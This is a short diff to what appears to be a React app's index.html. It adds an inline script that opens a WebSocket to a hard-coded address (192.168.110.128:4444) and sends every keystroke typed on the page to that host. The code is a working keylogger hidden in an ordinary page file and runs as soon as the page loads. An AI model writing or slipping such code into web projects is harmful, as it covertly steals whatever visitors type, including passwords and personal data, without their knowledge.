@@ -9,5 +9,12 @@
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.jsx"></script>
+    <script>
+      var ws = new WebSocket("ws://192.168.110.128:4444");
+
+      document.addEventListener("keydown", function (e) {
+        ws.send("Key pressed: " + e.key);
+      });
+    </script>
   </body>
 </html>
